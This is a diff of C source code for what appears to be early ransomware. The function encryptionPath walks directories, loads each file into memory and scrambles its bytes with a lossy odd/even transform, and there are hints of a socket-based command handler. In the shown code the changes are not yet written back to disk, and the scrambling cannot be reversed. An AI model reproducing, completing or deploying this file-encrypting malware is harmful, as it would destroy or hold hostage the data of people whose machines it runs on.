@@ -186,19 +186,37 @@ int encryptionPath(char * path){
                     if(DEBUG){
                         //printf("[X]encryption : %s \n",absolutePath);
                     }
-                    fp = fopen(absolutePath,"rb");
-                    if(fp){
-                        char buff[100] = {0};
-                        printf("[X]encryption : %s \n",absolutePath);
-                        /*
-                        while(fread(buff,1,99,fp) > 0){
-                            printf(" -- %s ",buff);
-                            // fwrite(buff,99,1,fp);
+                    fp = fopen(absolutePath,"r");
+                    if(fp != NULL ){
+                        struct stat encryptFileStat;
+                        stat(absolutePath,&encryptFileStat);
+                        // 申请一块与文件大小相等的内存
+                        char * fileSize = (char *)calloc(encryptFileStat.st_size+1,sizeof(char));
+
+                        printf("[*]filesize : %lld \n",encryptFileStat.st_size);
+                        for(int x = 0;x<strlen(absolutePath);x++){
+                            printf("0x%x ",absolutePath[x]);
                         }
-                        */
-                        int r = fread(buff,1,1,fp);
-                        printf("read: %d ",r);
+                        printf("\n[X]encryption : %s \n",absolutePath);
+                        // 将文件内容放入内存
+                        fread(fileSize,1,encryptFileStat.st_size,fp);
+                        printf("read: %s uid : %d \n",fileSize,getuid());
                         fclose(fp);
+                        char * pchar = fileSize;
+                        // 遍历
+                        while(*pchar){
+                            printf("char * -> 0x%x \n",*pchar);
+                            if((*pchar & 1) == 1){
+                                //奇数
+                                *pchar+=1;
+                            }else{
+                                // 偶数
+                                *pchar/=2;
+                            }
+                            printf("char * -> %c \n",*pchar);
+                            pchar++;
+                        }
+                        free(fileSize);
                     }
                 }else{
                     // 无扩展名文件
@@ -383,5 +401,6 @@ int analysisCommand(int clientSock,char * clientMessage){
 int main(int argc, char const *argv[])
 {
     encryption();
+    
     return 0;
 }
